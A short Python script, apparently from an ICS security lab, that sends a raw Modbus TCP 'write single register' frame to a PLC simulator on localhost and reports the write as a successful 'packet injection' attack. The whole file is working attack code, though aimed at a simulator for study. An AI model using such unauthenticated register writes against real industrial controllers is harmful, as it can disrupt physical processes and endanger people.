import socket

# Conceptual representation of direct frame delivery over plzain TCP
target_host = "127.0.0.1"
target_port = 5020  # Port where PLC simulator listens

payload = b"\x00\x01\x00\x00\x00\x06\x01\x06\x00\x04\x27\x0f"
# af_net specifies the address family ipv4 and sockStream specifies tcp protocl

print("Packet injection attacker attempting to connect to plc simulator...")
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    print("Packet injection attacker connected to plc simulator...")
    s.connect((target_host, target_port))
    s.sendall(payload)
    # get response to confirm attack succeded.basically read response 1024 bbytes
    response = s.recv(1024)


    print("\n--- Payload Sent ---")
    print(f"Raw Bytes : {payload.hex()}")
        
    print("\n--- PLC Response Received ---")
    print(f"Raw Bytes : {response.hex()}")
    print("Success: Packet executed on PLC.")


    